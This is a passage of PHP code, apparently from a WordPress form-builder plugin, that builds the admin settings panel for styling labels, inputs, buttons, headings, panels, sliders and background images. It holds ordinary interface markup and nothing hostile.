								$output .= '<small>Sub-label Text</small>';
								$output .= '<div class="input-group input-group-sm">';
									$output .= '<input type="text" class="form-control" name="set_subtext" placeholder="Add text" id="set_subtext">';
	/*** Sub-Label text bold ***/
									$output .= '<span class="input-group-addon sub-label-bold" title="Bold">';
										$output .= '<span class="fa fa-bold"></span>';
									$output .= '</span>';
	/*** Sub-Label text italic ***/
									$output .= '<span class="input-group-addon sub-label-italic" title="Italic">';
										$output .= '<span class="fa fa-italic"></span>';
									$output .= '</span>';
	/*** Sub-Label text underline ***/
									$output .= '<span class="input-group-addon sub-label-underline" title="Underline">';
										$output .= '<span class="fa fa-underline"></span>';
									$output .= '</span>';
	/*** Sub-Label text color ***/
									$output .= '<span class="input-group-addon color-picker"><input type="text" class="form-control sub-label-color" name="label-color" id="bs-color"></span>';
								$output .= '</div>';
										
								$output .= '<div role="toolbar" class="btn-toolbar">';
	/*** Label position ***/
									$output .= '<div role="group" class="btn-group label-position">';
										$output .= '<small>Label Position</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light left" type="button" 	title="Left"><i class="fa fa-arrow-left"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light top" type="button" 	title="Top"><i class="fa fa-arrow-up"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light right" type="button" title="Right"><i class="fa fa-arrow-right"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light none" type="button" 	title="Hidden"><i class="fa fa-eye-slash"></i></button>';
									$output .= '</div>';
	/*** Label alignment ***/
									$output .= '<div role="group" class="btn-group align-label">';
										$output .= '<small>Text Alignment</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
									$output .= '</div>';
	/*** Label size ***/
									$output .= '<div role="group" class="btn-group label-size">';
										$output .= '<small>Text Size</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light small" type="button" title="Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light normal" type="button" title="Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light large" type="button" title="Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
									$output .= '</div>';
										
								$output .= '</div>';
	/*** Label width ***/									
								$output .= '<div class="row">';
									$output .= '<div class="col-sm-12">';
										$output .= '<small class="width_distribution">Width Distribution</small>';
									$output .= '</div>';
									$output .= '<div class="col-sm-1">';
										$output .= '<small class="width_indicator left"><input type="text" name="set_label_width" id="set_label_width" class="form-control"></small>';
									$output .= '</div>';
									$output .= '<div class="col-sm-10 width_slider"><br />';
										$output .= '<select name="label_width" id="label_width">
														<option>1</option>
														<option>2</option>
														<option>3</option>
														<option>4</option>
														<option>5</option>
														<option>6</option>
														<option>7</option>
														<option>8</option>
														<option>9</option>
														<option>10</option>
														<option>11</option>
														<option>12</option>
													</select>';
									$output .= '</div>';
										
									$output .= '<div class="col-sm-1">';
										$output .= '<small class="width_indicator right"><input type="text" name="set_input_width" id="set_input_width" class="form-control"></small>';
									$output .= '</div>';
								
								$output .= '</div>';
							$output .= '</div>';
							
//INPUT SETTINGS //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////				
							$output .= '<div class="input-settings settings-section" style="display:none;">';
							
								$output .= '<div role="toolbar" class="btn-toolbar col-3 ungeneric-input-settings">';
	/*** Input Placeholder ***/	
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input Placeholder</small>';
										$output .= '<input type="text" class="form-control" name="set_place_holder" id="set_input_placeholder"  placeholder="Placeholder text">';
									$output .= '</div>';
	/*** Input Name ***/
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input Name</small>';
										$output .= '<input type="text" class="form-control" name="set_input_name" id="set_input_name"  placeholder="Can not be empty!">';
									$output .= '</div>';
	/*** Input ID ***/							
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input ID</small>';
										$output .= '<input type="text" class="form-control" name="set_input_id" id="set_input_id"  placeholder="Unique Identifier">';
									$output .= '</div>';
									/*$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input Class</small>';
										$output .= '<input type="text" class="form-control" name="set_input_class" id="set_input_class"  placeholder="Set class">';
									$output .= '</div>';*/
								$output .= '</div>';
	/*** DATE TIME OPTIONS ***/
							$output .= '<div class="settings-date-options" style="display:none;">';
									
									$output .= '<div role="toolbar" class="btn-toolbar col-3">';
	/*** Date Format Placeholder ***/	
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Date Format</small>';
													$output .= '<select class="form-control" id="select_date_format">
																		
															<option value="DD/MM/YYYY hh:mm A">DD/MM/YYYY hh:mm A</option>
															<option value="YYYY/MM/DD hh:mm A">YYYY/MM/DD hh:mm A</option>
															<option value="DD-MM-YYYY hh:mm A">DD-MM-YYYY hh:mm A</option>
															<option value="YYYY-MM-DD hh:mm A">YYYY-MM-DD hh:mm A</option>
															<option value="custom">Custom</option>
														</select>
											';	
										
										$output .= '</div>';
										$output .= '<div class="input-group input-group-sm set-sutom-date-format hidden">';
											$output .= '<small>Custom Format</small>';
												$output .= '<input type="text" class="form-control " value="" placeholder="Set date format" name="set_date_format" id="set_date_format">';
											$output .= '</div>';
	/*** Date Format Language ***/							
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Language</small>';
											$output .= '<select class="form-control" id="date-picker-lang-selector"><option value="en">en</option><option value="ar-ma">ar-ma</option><option value="ar-sa">ar-sa</option><option value="ar-tn">ar-tn</option><option value="ar">ar</option><option value="bg">bg</option><option value="ca">ca</option><option value="cs">cs</option><option value="da">da</option><option value="de-at">de-at</option><option value="de">de</option><option value="el">el</option><option value="en-au">en-au</option><option value="en-ca">en-ca</option><option value="en-gb">en-gb</option><option value="es">es</option><option value="fa">fa</option><option value="fi">fi</option><option value="fr-ca">fr-ca</option><option value="fr">fr</option><option value="he">he</option><option value="hi">hi</option><option value="hr">hr</option><option value="hu">hu</option><option value="id">id</option><option value="is">is</option><option value="it">it</option><option value="ja">ja</option><option value="ko">ko</option><option value="lt">lt</option><option value="lv">lv</option><option value="nb">nb</option><option value="nl">nl</option><option value="pl">pl</option><option value="pt-br">pt-br</option><option value="pt">pt</option><option value="ro">ro</option><option value="ru">ru</option><option value="sk">sk</option><option value="sl">sl</option><option value="sr-cyrl">sr-cyrl</option><option value="sr">sr</option><option value="sv">sv</option><option value="th">th</option><option value="tr">tr</option><option value="uk">uk</option><option value="vi">vi</option><option value="zh-cn">zh-cn</option><option value="zh-tw">zh-tw</option></select>';	
										
										$output .= '</div>';
										
									$output .= '</div>';
								$output .= '</div>';							
	/**** SLIDER SETTINGS ****/
								$output .= '<div class="setting-wrapper settings-spinner-options">';	
										
											$output .= '<div role="toolbar" class="btn-toolbar col-4">';
				
				/*** Start Value ***/	
				/*								$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Start value</small>';
													$output .= '<input type="text" class="form-control" name="spin_start_value" id="spin_start_value"  placeholder="Enter start value">';
												$output .= '</div>';*/
				/*** Min Value ***/
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Min Value</small>';
													$output .= '<input type="text" class="form-control" name="spin_minimum_value" id="spin_minimum_value"  placeholder="Enter min value">';
												$output .= '</div>';
				/*** Max Value ***/							
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Max Value</small>';
													$output .= '<input type="text" class="form-control" name="spin_maximum_value" id="spin_maximum_value"  placeholder="Enter max value">';
												$output .= '</div>';
				/*** Step Value ***/							
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Step</small>';
													$output .= '<input type="text" class="form-control" name="spin_step_value" id="spin_step_value"  placeholder="Enter step value">';
												$output .= '</div>';
				/*** Decimals ***/	
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Decimals</small>';
													$output .= '<input type="text" class="form-control" name="spin_decimal" id="spin_decimal"  placeholder="Enter start value">';
												$output .= '</div>';
											
										$output .= '</div>';
										
								$output .= '</div>';	
	
	/*** Input Styling ***/		
							$output .= '<div class="settings-input-styling">';						
								$output .= '<small>Default value & Input Styling</small>';
									$output .= '<div class="input-group input-group-sm">';
	/*** Input value ***/
										$output .= '<input type="text" class="form-control" name="set_input_val" placeholder="Set default value" id="set_input_val">';
										$output .= '<input type="text" class="form-control" name="set_default_select_value" placeholder="Set default option" id="set_default_select_value" style="display:none;">';
										$output .= '<input type="text" class="form-control" name="spin_start_value" id="spin_start_value"  placeholder="Enter start value"  style="display:none;">';
										$output .= '<input type="text" class="form-control" name="set_button_val" id="set_button_val"  placeholder="Enter button text"  style="display:none;">';
										$output .= '<input type="text" class="form-control" name="set_heading_text" id="set_heading_text"  placeholder="Use {math_result} for math result place holder"  style="display:none;">';
										$output .= '<input type="text" class="form-control" name="max_tags" id="max_tags"  placeholder="Enter maximum tags"  style="display:none;">';
	/*							
										$output .= '<span class="input-group-addon  input-align-left" title="Left">';
											$output .= '<span class="fa fa-align-left"></span>';
										$output .= '</span>';
	
										$output .= '<span class="input-group-addon input-align-center" title="Center">';
											$output .= '<span class="fa fa-align-center"></span>';
										$output .= '</span>';
	
										$output .= '<span class="input-group-addon input-align-right" title="Right">';
											$output .= '<span class="fa fa-align-right"></span>';
										$output .= '</span>';
	
	**/									
										$output .= '<span class="input-group-addon input-bold" title="Bold">';
											$output .= '<span class="fa fa-bold"></span>';
										$output .= '</span>';
	/*** Input italic ***/
										$output .= '<span class="input-group-addon input-italic" title="Italic">';
											$output .= '<span class="fa fa-italic"></span>';
										$output .= '</span>';
	/*** Input underline ***/
										$output .= '<span class="input-group-addon input-underline" title="Underline">';
											$output .= '<span class="fa fa-underline"></span>';
										$output .= '</span>';
	/*** Input text color ***/
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Text Color">TX</span><span class="input-group-addon color-picker"><input type="text" class="form-control input-color" name="input-color" id="bs-color"></span>';
	/*** Input text color ***/
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Background Color">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control input-bg-color" name="input-bg-color" id="bs-color"></span>';
	/*** Input text color ***/
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Border Color">BRD</span><span class="input-group-addon color-picker"><input type="text" class="form-control input-border-color" name="input-border-color" id="bs-color"></span>';
									$output .= '</div>';
							
	
	/*** Input alignment ***/
							$output .= '<div role="toolbar" class="btn-toolbar ungeneric-input-settings">';
									
									$output .= '<div role="group" class="btn-group align-input">';
										$output .= '<small>Text Alignment</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
									$output .= '</div>';
	/*** Input size ***/
									$output .= '<div role="group" class="btn-group input-size">';
										$output .= '<small>Input Size</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light small" type="button" title="Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light normal" type="button" title="Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light large" type="button" title="Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
									$output .= '</div>';
									$output .= '<div role="group" class="btn-group input-corners">';
										$output .= '<small>Corners</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light square" type="button" title="Square border"><i class="fa fa-stop"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light normal" type="button" title="Rounded Border"><i class="fa fa-square"></i></button>';
										//$output .= '<button class="btn btn-default waves-effect waves-light pill" type="button" title="Large"></button>';
									$output .= '</div>';
									$output .= '<div role="group" class="btn-group recreate-field setting-recreate-field">';
											$output .= '<small>Field Replication</small>';
											$output .= '<button class="btn btn-default not-rounded waves-effect waves-light enable-recreation" type="button" title="Enables Field Replication">Enable</button>';
											$output .= '<button class="btn btn-default not-rounded waves-effect waves-light disable-recreation active" type="button" title="Disables Field Replication">Disable</button>';
										$output .= '</div>';
							$output .= '</div>';
						$output .= '</div>';
	
	/*** Button Options ***/
			/*** Button alignment ***/
							$output .= '<div role="toolbar" class="btn-toolbar button-settings">';
									
									$output .= '<div role="group" class="btn-group button-type">';
										$output .= '<small>Button Type</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light do-submit not-rounded" type="button" 	title="Submit"><span class="btn-tx">Submit</span></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light next not-rounded" type="button" 	title="Next"><span class="btn-tx">Next</span></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light prev not-rounded" type="button" title="Previous"><span class="btn-tx">Previous</span></button>';
									$output .= '</div>';
									
									$output .= '<div role="group" class="btn-group button-position">';
										$output .= '<small>Button Position</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light left" type="button" 	title="Left"><i class="fa fa-align-left"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light center" type="button" 	title="Center"><i class="fa fa-align-center"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
									$output .= '</div>';
									
									$output .= '<div role="group" class="btn-group button-text-align">';
										$output .= '<small>Text Alignment</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
									$output .= '</div>';
							$output .= '</div>';
							$output .= '<div role="toolbar" class="btn-toolbar button-settings">';
			/*** Button size ***/
									$output .= '<div role="group" class="btn-group button-size">';
										$output .= '<small>Button Size</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light small" type="button" title="Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light normal" type="button" title="Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light large" type="button" title="Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
									$output .= '</div>';
									
									$output .= '<div role="group" class="btn-group button-width">';
										$output .= '<small>Button Width</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light not-rounded default" type="button" title="Default"><span class="btn-tx">Default</span></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light not-rounded full_button" type="button" title="Full"><span class="btn-tx">Full</span></button>';
									$output .= '</div>';
									
							$output .= '</div>';
	
	/*** Heading Options ***/
			/*** Heading Size ***/
							$output .= '<div role="toolbar" class="btn-toolbar heading-settings">';
									
									$output .= '<div role="group" class="btn-group heading-size">';
										$output .= '<small>Heading Size</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light heading_1" type="button" title="Heading 1"><span class="btn-tx">H1</span></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light heading_2" type="button" title="Heading 2"><span class="btn-tx">H2</span></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light heading_3" type="button" title="Heading 3"><span class="btn-tx">H3</span></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light heading_4" type="button" title="Heading 4"><span class="btn-tx">H4</span></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light heading_5" type="button" title="Heading 5"><span class="btn-tx">H5</span></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light heading_6" type="button" title="Heading 6"><span class="btn-tx">H6</span></button>';
									$output .= '</div>';
			/*** Button size ***/					
									$output .= '<div role="group" class="btn-group heading-text-align">';
										$output .= '<small>Text Alignment</small>';
										$output .= '<button class="btn btn-default waves-effect waves-light left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
										$output .= '<button class="btn btn-default waves-effect waves-light right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
									$output .= '</div>';
									
							$output .= '</div>';
							
	
	/*** Panel Options ***/
			
							/*** Slider Styling ***/
							$output .= '<div class="panel-settings" style="display:none;">';
									$output .= '<small>Panel</small>';
									$output .= '<input type="text" class="form-control" name="set_panel_heading" id="set_panel_heading"  placeholder="Panel Heading">';
									$output .= '<div role="group" class="input-group input-group-sm">';
										
										//$output .= '<span class="input-group-addon current_slider_icon"><i class="">Select Icon</i></span>';
										
										//$output .= '<input type="text" class="form-control" name="set_addon_after_text" id="set_addon_after_text"  placeholder="add text">';
										
										$output .= '<span class="input-group-addon panel-heading-bold" title="Bold" style="border-right:1px solid #ccc">';
											$output .= '<span class="fa fa-bold"></span>';
										$output .= '</span>';
	/*** Input italic ***/
										$output .= '<span class="input-group-addon panel-heading-italic" title="Italic">';
											$output .= '<span class="fa fa-italic"></span>';
										$output .= '</span>';
	/*** Input underline ***/
										$output .= '<span class="input-group-addon panel-heading-underline" title="Underline">';
											$output .= '<span class="fa fa-underline"></span>';
										$output .= '</span>';
										
										$output .= '<span class="input-group-addon group-addon-label" title="Panel Heading Text Color">TX</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-panel-heading-text-color" name="set-panel-heading-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label"  title="Panel Heading Background Color">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-panel-heading-bg-color" name="set-panel-heading-bg-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" title="Panel Heading Border Color">BR</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-panel-heading-border-color" name="set-panel-heading-border-color" id="bs-color"></span>';	
										$output .= '<span class="input-group-addon group-addon-label" title="Panel Body Background">BBG</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-panel-body-bg-color" name="set-panel-body-bg-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" title="Panel Body Border Color">BBR</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-panel-body-border-color" name="set-panel-body-border-color" id="bs-color"></span>';
									
								$output .= '</div>';
									$output .= '<div role="toolbar" class="btn-toolbar">';
										$output .= '<div role="group" class="btn-group show_panel-heading">';
											$output .= '<small>Show heading</small>';
											$output .= '<button class="btn btn-default waves-effect waves-light yes" type="button" title="Yes"><span class="btn-tx">Yes</span></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light no" type="button" title="No"><span class="btn-tx">No</span></button>';
										$output .= '</div>';
										
										$output .= '<div role="group" class="btn-group panel-heading-text-align">';
											$output .= '<small>Text Alignment</small>';
											$output .= '<button class="btn btn-default waves-effect waves-light left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
										$output .= '</div>';
										
										$output .= '<div role="group" class="btn-group panel-heading-size">';
											$output .= '<small>Heading Size</small>';
											$output .= '<button class="btn btn-default waves-effect waves-light small" type="button" title="Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light normal" type="button" title="Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light large" type="button" title="Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
										$output .= '</div>';
									$output .= '</div>';
							$output .= '</div>';
	
	/*** HTML options ***/						
							$output .= '<div class="settings-html" style="display:none;">';
								$output .= '<small>Add Text or HTML</small>';
								$output .= '<textarea class="form-control" name="set_html" id="set_html" ></textarea>';
							$output .= '</div>';
	
	/*** Select options ***/						
							$output .= '<div class="settings-select-options" style="display:none;">';
								$output .= '<small>Set Options</small>';
								$output .= '<textarea class="form-control" name="set_options" id="set_options" ></textarea>';
							$output .= '</div>';
	
	
	/*** Radio AND Check options ***/						
							$output .= '<div class="settings-radio-options" style="display:none;">';
								$output .= '<small>Set Options</small>';
								$output .= '<textarea class="form-control" name="set_radios" id="set_radios" ></textarea>';
							$output .= '</div>';
							
	/*** Autocomplete options ***/						
							$output .= '<div class="settings-autocomplete-options" style="display:none;">';
								$output .= '<small>Set Selection list</small>';
								$output .= '<textarea class="form-control" name="set_selections" id="set_selections"></textarea>';
							$output .= '</div>';
							
							$output .= '<div class="setting-wrapper setting-input-add-ons">';
	/*** Input PRE Add-on ***/
									$output .= '<small>Set Icon before</small>';
									$output .= '<div role="group" class="input-group input-group-sm">';
										
										$output .= '<span class="input-group-addon current_icon_before"><i class="">Select Icon</i></span>';
										$output .= '<input type="text" class="form-control" name="set_icon_before" id="set_icon_before"  placeholder="or enter icon class">';
										//$output .= '<input type="text" class="form-control" name="set_addon_before_text" id="set_addon_before_text"  placeholder="add text">';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Text Color">TX</span><span class="input-group-addon color-picker"><input type="text" class="form-control pre-icon-text-color" name="pre-icon-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Background Color">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control pre-icon-bg-color" name="pre-icon-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Border Color">BRD</span><span class="input-group-addon color-picker"><input type="text" class="form-control pre-icon-border-color" name="pre-icon-border-color" id="bs-color"></span>';
									$output .= '</div>';
	/*** Input POST Add-on ***/
									$output .= '<small>Set Icon After</small>';
									$output .= '<div role="group" class="input-group input-group-sm">';
										
										$output .= '<span class="input-group-addon current_icon_after"><i class="">Select Icon</i></span>';
										$output .= '<input type="text" class="form-control" name="set_icon_after" id="set_icon_after"  placeholder="or enter icon class">';
										//$output .= '<input type="text" class="form-control" name="set_addon_after_text" id="set_addon_after_text"  placeholder="add text">';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Text Color">TX</span><span class="input-group-addon color-picker"><input type="text" class="form-control post-icon-text-color" name="post-icon-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Background Color">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control post-icon-bg-color" name="post-icon-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Border Color">BRD</span><span class="input-group-addon color-picker"><input type="text" class="form-control post-icon-border-color" name="post-icon-border-color" id="bs-color"></span>';
									$output .= '</div>';
									
									
									
							$output .= '</div>';
				
				$output .= '<div role="toolbar" class="btn-toolbar col-3 img-upload-input-settings">';
	/*** Input Placeholder ***/	
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Select Button Text</small>';
										$output .= '<input type="text" class="form-control" name="img-upload-select" id="img-upload-select"  placeholder="">';
									$output .= '</div>';
	/*** Input Name ***/
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Change Button Text</small>';
										$output .= '<input type="text" class="form-control" name="img-upload-change" id="img-upload-change"  placeholder="">';
									$output .= '</div>';
	/*** Input ID ***/							
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Remove Button Text</small>';
										$output .= '<input type="text" class="form-control" name="img-upload-remove" id="img-upload-remove"  placeholder="">';
									$output .= '</div>';
									/*$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input Class</small>';
										$output .= '<input type="text" class="form-control" name="set_input_class" id="set_input_class"  placeholder="Set class">';
									$output .= '</div>';*/
								$output .= '</div>';
							
							
							/*** Radio Styling ***/
							$output .= '<div class="settings-radio-styling" style="display:none;">';
									$output .= '<small>Radio Styling</small>';
									$output .= '<div role="group" class="input-group input-group-sm">';
										
										$output .= '<span class="input-group-addon current_radio_icon"><i class="">Select Icon</i></span>';
										$output .= '<input type="text" class="form-control" name="set_radio_icon" id="set_radio_icon"  placeholder="or enter icon class">';
										//$output .= '<input type="text" class="form-control" name="set_addon_after_text" id="set_addon_after_text"  placeholder="add text">';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Label Colors">LB</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-radio-label-color" name="set-radio-label-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Text Color">TX</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-radio-text-color" name="set-radio-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Background Color">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-radio-bg-color" name="set-radio-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Border Color">BRD</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-radio-border-color" name="set-radio-border-color" id="bs-color"></span>';
									$output .= '</div>';
									
									$output .= '<div role="group" class="btn-group display-radios-checks">';
											$output .= '<small>Layout</small>';
											$output .= '<button class="btn btn-default waves-effect waves-light title="Inline" type="button"><span class="glyphicon glyphicon-arrow-right"></span></button>
														<button class="btn btn-default waves-effect waves-light 1c" type="button" title="1 Column"><span class="glyphicon glyphicon-arrow-down"></span></button>
														<button class="btn btn-default waves-effect waves-light 2c" type="button" title="2 Columns">2c</button>
														<button class="btn btn-default waves-effect waves-light 3c" type="button" title="3 Columns">3c</button>
														<button class="btn btn-default waves-effect waves-light 4c" type="button" title="4 Columns">4c</button>';
										$output .= '</div>';
									
							$output .= '</div>';
							
							/*** Slider Styling ***/
							$output .= '<div class="settings-slider-styling" style="display:none;">';
									$output .= '<small>Slider Styling</small>';
									$output .= '<div role="group" class="input-group input-group-sm">';
										
										//$output .= '<span class="input-group-addon current_slider_icon"><i class="">Select Icon</i></span>';
										$output .= '<input type="text" class="form-control" name="count_text" id="count_text"  placeholder="{x}=Count placeholder">';
										//$output .= '<input type="text" class="form-control" name="set_addon_after_text" id="set_addon_after_text"  placeholder="add text">';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Handel Text Color">HTX</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-handel-text-color" name="set-slider-handel-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Handel Background Color">HBG</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-handel-bg-color" name="set-slider-handel-bg-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Handel Border Color">HBR</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-handel-border-color" name="set-slider-handel-border-color" id="bs-color"></span>';	
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Slide Background">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-bg-color" name="set-slider-bg-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Slide Background Fill">BGF</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-fill-color" name="set-slider-fill-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Slide Border">BR</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-slider-border-color" name="set-slider-border-color" id="bs-color"></span>';	
									
									$output .= '</div>';
							$output .= '</div>';
							
							
	
							
							
	/*** Background settings ***/	
								$output .= '<div class="setting-wrapper setting-bg-image">';						
									$output .= '<small>Background Settings</small>';
									$output .= '<div role="toolbar" class="btn-toolbar bg-settings">';
	/*** Background image ***/									
										$output .= '<div role="group" class="btn-group align-label">';
											$output .= '<small>Image</small>';
											$output .= '<form name="do-upload-image" id="do-upload-image" action="'.admin_url('admin-ajax.php').'" method="post" enctype="multipart/form-data">';
												$output .= '<input type="hidden" name="action" value="do_upload_image">';
												$output .= '<div class="fileinput fileinput-new" data-provides="fileinput">';
													$output .= '<div class="the_input_element fileinput-preview thumbnail" data-trigger="fileinput" style="width: 100px; height: 100px;"></div>';
													$output .= '<div class="upload-image-controls">';
														$output .= '<span class="input-group-addon btn-file the_input_element error_message" data-content="Please select an image" data-secondary-message="Invalid image extension" data-placement="top">';
															$output .= '<span class="fileinput-new"><span class="fa fa-cloud-upload"></span></span>';
															$output .= '<span class="fileinput-exists"><span class="fa fa-edit"></span></span>';
															$output .= '<input type="file" name="do_image_upload_preview" >';
														$output .= '</span>';
														$output .= '<a href="#" class="input-group-addon fileinput-exists" data-dismiss="fileinput"><span class="fa fa-close"></span></a>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</form>';
											
											
											
										$output .= '</div>';
	/*** Background size ***/									
										$output .= '<div role="group" class="btn-group bg-size">';
											$output .= '<small>Size</small>';
											$output .= '<button class="btn btn-default waves-effect waves-light auto" type="button" title="Auto"><span class="icon-text">Auto</span></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light contain" type="button" title="Contain"><i class="fa fa-compress"></i></button>';
											$output .= '<button class="btn btn-default waves-effect waves-light cover" type="button" title="Cover"><i class="fa fa-expand"></i></button>';
										$output .= '</div>';
	/*** Background repeat ***/									
										$output .= '<div role="group" class="btn-group bg-repeat">';
											$output .= '<small>Repeat</small>';
											$output .= '<button class="btn btn-default waves-effect waves-light repeat" type="button" title="Repeat X &amp; Y"><i class="fa fa-arrows"></i></button>';
